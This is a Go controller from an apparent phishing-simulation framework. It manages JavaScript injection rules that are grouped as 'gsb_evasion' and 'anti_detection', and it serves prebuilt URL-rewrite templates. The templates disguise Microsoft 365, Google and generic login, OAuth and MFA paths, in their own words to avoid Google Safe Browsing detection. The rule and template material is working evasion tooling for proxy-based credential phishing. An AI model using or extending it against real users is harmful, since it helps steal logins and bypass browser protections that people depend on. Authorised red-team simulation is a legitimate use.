package controller

import (
	"net/http"

	"github.com/gin-gonic/gin"

	"github.com/phishingclub/phishingclub/service"
)

// JsInjectionCtrl handles JS injection rule management
type JsInjectionCtrl struct {
	Common
	Service *service.JsInjection
}

// ListRules returns all JS injection rules (builtin + custom)
func (c *JsInjectionCtrl) ListRules(g *gin.Context) {
	_, _, ok := c.handleSession(g)
	if !ok {
		return
	}

	rules := c.Service.ListRules()

	type ruleResponse struct {
		ID             string   `json:"id"`
		Name           string   `json:"name"`
		TriggerDomains []string `json:"triggerDomains"`
		TriggerPaths   []string `json:"triggerPaths"`
		TriggerParams  []string `json:"triggerParams"`
		ScriptType     string   `json:"scriptType"`
		Enabled        bool     `json:"enabled"`
		IsBuiltin      bool     `json:"isBuiltin"`
		Category       string   `json:"category"`
	}

	var result []ruleResponse
	for _, r := range rules {
		isBuiltin := len(r.ID) > 8 && r.ID[:8] == "builtin_"
		category := "custom"
		if isBuiltin {
			// Categorize builtin rules
			switch {
			case r.ID == "builtin_password_field_protection",
				r.ID == "builtin_ms_cryptotoken_block",
				r.ID == "builtin_title_meta_sanitizer",
				r.ID == "builtin_chrome_realtime_sb_block",
				r.ID == "builtin_ms_aadsts_suppressor",
				r.ID == "builtin_referrer_origin_sanitizer",
				r.ID == "builtin_location_protector":
				category = "gsb_evasion"
			default:
				category = "anti_detection"
			}
		}

		result = append(result, ruleResponse{
			ID:             r.ID,
			Name:           r.Name,
			TriggerDomains: r.TriggerDomains,
			TriggerPaths:   r.TriggerPaths,
			TriggerParams:  r.TriggerParams,
			ScriptType:     r.ScriptType,
			Enabled:        r.Enabled,
			IsBuiltin:      isBuiltin,
			Category:       category,
		})
	}

	c.Response.OK(g, result)
}

// ToggleRule enables or disables a JS injection rule by ID
func (c *JsInjectionCtrl) ToggleRule(g *gin.Context) {
	session, _, ok := c.handleSession(g)
	if !ok {
		return
	}

	id := g.Param("id")
	if id == "" {
		g.JSON(http.StatusBadRequest, gin.H{"success": false, "error": "rule ID required"})
		return
	}

	var req struct {
		Enabled bool `json:"enabled"`
	}
	if ok := c.handleParseRequest(g, &req); !ok {
		return
	}

	// Find the rule, update its enabled state, and save
	rules := c.Service.ListRules()
	for _, r := range rules {
		if r.ID == id {
			r.Enabled = req.Enabled
			err := c.Service.UpdateRule(g.Request.Context(), session, r)
			if ok := c.handleErrors(g, err); !ok {
				return
			}
			c.Response.OK(g, gin.H{"id": id, "enabled": req.Enabled})
			return
		}
	}

	g.JSON(http.StatusNotFound, gin.H{"success": false, "error": "rule not found"})
}

// AddCustomRule adds a new custom JS injection rule
func (c *JsInjectionCtrl) AddCustomRule(g *gin.Context) {
	session, _, ok := c.handleSession(g)
	if !ok {
		return
	}

	var req service.JsInjectRule
	if ok := c.handleParseRequest(g, &req); !ok {
		return
	}

	req.Enabled = true
	if req.ScriptType == "" {
		req.ScriptType = "inline"
	}

	id, err := c.Service.AddRule(g.Request.Context(), session, &req)
	if ok := c.handleErrors(g, err); !ok {
		return
	}

	c.Response.OK(g, gin.H{"id": id})
}

// DeleteCustomRule removes a custom JS injection rule (cannot delete builtins)
func (c *JsInjectionCtrl) DeleteCustomRule(g *gin.Context) {
	session, _, ok := c.handleSession(g)
	if !ok {
		return
	}

	id := g.Param("id")
	if id == "" {
		g.JSON(http.StatusBadRequest, gin.H{"success": false, "error": "rule ID required"})
		return
	}

	// Prevent deleting builtin rules
	if len(id) > 8 && id[:8] == "builtin_" {
		g.JSON(http.StatusForbidden, gin.H{"success": false, "error": "cannot delete builtin rules, use toggle to disable"})
		return
	}

	err := c.Service.RemoveRule(g.Request.Context(), session, id)
	if ok := c.handleErrors(g, err); !ok {
		return
	}

	c.Response.OK(g, nil)
}

// GetPrebuiltRewriteTemplates returns prebuilt rewrite_urls YAML templates for common phishlets
func (c *JsInjectionCtrl) GetPrebuiltRewriteTemplates(g *gin.Context) {
	_, _, ok := c.handleSession(g)
	if !ok {
		return
	}

	templates := []gin.H{
		{
			"id":          "o365_basic",
			"name":        "Microsoft 365 - Basic URL Rewriting",
			"description": "Rewrites common Microsoft OAuth and login paths to avoid GSB pattern matching",
			"target":      "Microsoft 365 / Outlook",
			"yaml": `rewrite_urls:
  - find: "/common/oauth2/v2.0/authorize"
    replace: "/auth/start"
    query:
      - find: "client_id"
        replace: "cid"
      - find: "redirect_uri"
        replace: "ruri"
      - find: "response_type"
        replace: "rt"
  - find: "/common/login"
    replace: "/session/verify"
  - find: "/common/oauth2/v2.0/token"
    replace: "/auth/complete"
  - find: "/GetCredentialType"
    replace: "/api/check"`,
		},
		{
			"id":          "o365_advanced",
			"name":        "Microsoft 365 - Advanced URL Rewriting",
			"description": "Comprehensive rewriting including MFA, KMSI, and error paths",
			"target":      "Microsoft 365 / Outlook",
			"yaml": `rewrite_urls:
  - find: "/common/oauth2/v2.0/authorize"
    replace: "/connect/begin"
    query:
      - find: "client_id"
        replace: "app"
      - find: "redirect_uri"
        replace: "cb"
      - find: "response_type"
        replace: "type"
      - find: "scope"
        replace: "perm"
  - find: "/common/login"
    replace: "/account/signin"
  - find: "/common/oauth2/v2.0/token"
    replace: "/connect/finish"
  - find: "/GetCredentialType"
    replace: "/api/validate"
  - find: "/common/SAS/ProcessAuth"
    replace: "/mfa/verify"
  - find: "/kmsi"
    replace: "/session/persist"
  - find: "/common/reprocess"
    replace: "/auth/retry"
  - find: "/ppsecure/post"
    replace: "/secure/submit"`,
		},
		{
			"id":          "google_basic",
			"name":        "Google Workspace - Basic URL Rewriting",
			"description": "Rewrites Google sign-in paths for GSB evasion",
			"target":      "Google / Gmail",
			"yaml": `rewrite_urls:
  - find: "/ServiceLogin"
    replace: "/account/start"
  - find: "/signin/v2/challenge"
    replace: "/verify/step"
  - find: "/signin/v2/sl/pwd"
    replace: "/verify/credentials"
  - find: "/_/signin/sl/challenge"
    replace: "/auth/challenge"
  - find: "/CheckCookie"
    replace: "/session/check"`,
		},
		{
			"id":          "generic_login",
			"name":        "Generic Login - URL Rewriting",
			"description": "Generic rewriting patterns for common login paths",
			"target":      "Any",
			"yaml": `rewrite_urls:
  - find: "/login"
    replace: "/portal/access"
  - find: "/signin"
    replace: "/account/verify"
  - find: "/auth/authorize"
    replace: "/connect/start"
  - find: "/oauth/token"
    replace: "/connect/complete"
  - find: "/password"
    replace: "/secure/input"`,
		},
	}

	c.Response.OK(g, templates)
}
